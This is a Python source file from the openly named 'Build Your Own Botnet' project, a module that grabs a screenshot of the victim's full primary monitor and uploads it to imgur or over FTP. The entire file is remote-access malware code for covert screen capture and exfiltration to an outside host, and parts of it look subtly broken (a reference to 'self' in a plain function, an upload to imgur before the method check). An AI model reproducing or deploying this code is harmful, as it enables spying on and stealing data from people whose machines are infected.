#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# modules

import util

# globals

packages    = ['mss']
platforms   = ['win32','linux2','darwin']
util.is_compatible(platforms, __name__)
util.imports(packages)


def screenshot(method):
    try:
        assert isinstance(method, str), "argument 'method' must be of type '{}'".format(str)
        if 'mss' in globals():
            if method in ('ftp', 'imgur') and hasattr(util, method):
                with mss.mss() as screen:
                    img = screen.grab(screen.monitors[0])
                png     = util.png(img)
                result  = util.imgur(png)
                return getattr(util, method)(result)
            else:
                util.debug("invalid upload method '{}' for module 'screenshot' (valid: ftp, imgur)".format(method))
        else:
            import mss
            return screenshot(method)
    except Exception as e:
        util.debug("{} error: {}".format(self.screenshot.func_name, str(e)))


